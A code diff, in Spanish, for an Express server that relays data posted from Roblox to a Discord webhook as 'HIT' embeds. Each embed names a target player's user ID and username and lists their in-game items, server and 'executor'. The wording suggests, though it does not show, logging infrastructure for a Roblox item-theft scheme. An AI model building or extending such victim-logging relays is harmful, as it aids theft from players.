@@ -5,7 +5,7 @@ const axios = require('axios');
 const app = express();
 app.use(express.json());
 
-// Middleware de seguridad: exige una API Key en la cabecera Authorization
+// Middleware de seguridad (API Key)
 app.use((req, res, next) => {
   const authHeader = req.headers.authorization;
   if (process.env.API_KEY && authHeader !== `Bearer ${process.env.API_KEY}`) {
@@ -14,16 +14,15 @@ app.use((req, res, next) => {
   next();
 });
 
-// Endpoint que recibe los datos desde Roblox
+// Endpoint único para recibir datos de Roblox
 app.post('/transform', async (req, res) => {
   try {
     const data = req.body;
-    const discordMessage = buildDiscordMessage(data);
+    const embed = buildHitEmbed(data);
 
-    // Enviar el mensaje al webhook de Discord
+    // Enviar al webhook de HITS (definido en variables de entorno)
     await axios.post(process.env.DISCORD_WEBHOOK_URL, {
-      content: discordMessage
-      // Si prefieres usar embeds, cambia la línea anterior por un objeto "embeds"
+      embeds: [embed]
     });
 
     res.json({ status: 'ok', message: 'Mensaje enviado a Discord' });
@@ -33,21 +32,52 @@ app.post('/transform', async (req, res) => {
   }
 });
 
-// Función que formatea los datos en texto
-function buildDiscordMessage(data) {
-  let msg = `**${data.usuario}** — $${data.valor}/s\n`;
-  msg += `**Targets:**\n`;
-  if (data.targets && data.targets.length > 0) {
-    data.targets.forEach(t => {
-      msg += `- ${t.nombre}: ${t.info}\n`;
-    });
-  } else {
-    msg += `Ninguno\n`;
-  }
-  msg += `\n**Gears:** ${data.gears?.join(', ') || 'Ninguno'}\n`;
-  msg += `**Skins base:** ${data.skins?.join(', ') || 'Ninguno'}\n`;
-  msg += `\nServidor: ${data.server}\nJugadores: ${data.players}\nEjecutor: ${data.executor}\nHora: ${data.timestamp}`;
-  return msg;
+// Función que construye el Embed para el HIT
+function buildHitEmbed(data) {
+  // data esperado:
+  // {
+  //   type: "hit",
+  //   target: { userId: number, username: string },
+  //   brainrots: [string, ...],
+  //   baseSkins: [string, ...],
+  //   gears: [string, ...],
+  //   server: string,
+  //   players: number,
+  //   executor: string,
+  //   timestamp: string
+  // }
+
+  const target = data.target || {};
+  const brainrotList = data.brainrots?.join('\n') || 'Ninguno';
+  const skinsList = data.baseSkins?.join('\n') || 'Ninguno';
+  const gearsList = data.gears?.join('\n') || 'Ninguno';
+  const footer = `Servidor: ${data.server || '?'} | Jugadores: ${data.players || '?'} | Ejecutor: ${data.executor || '?'} | ${data.timestamp || ''}`;
+
+  return {
+    title: `🎯 HIT a ${target.username || 'Desconocido'} (${target.userId || '?'})`,
+    color: 0x2ecc71, // verde para HITS
+    fields: [
+      {
+        name: '🧠 Brainrots',
+        value: brainrotList,
+        inline: false
+      },
+      {
+        name: '🎒 Base Skins',
+        value: skinsList,
+        inline: true
+      },
+      {
+        name: '⚙️ Gears',
+        value: gearsList,
+        inline: true
+      }
+    ],
+    footer: {
+      text: footer
+    },
+    timestamp: new Date().toISOString()
+  };
 }
 
 const PORT = process.env.PORT || 3000;
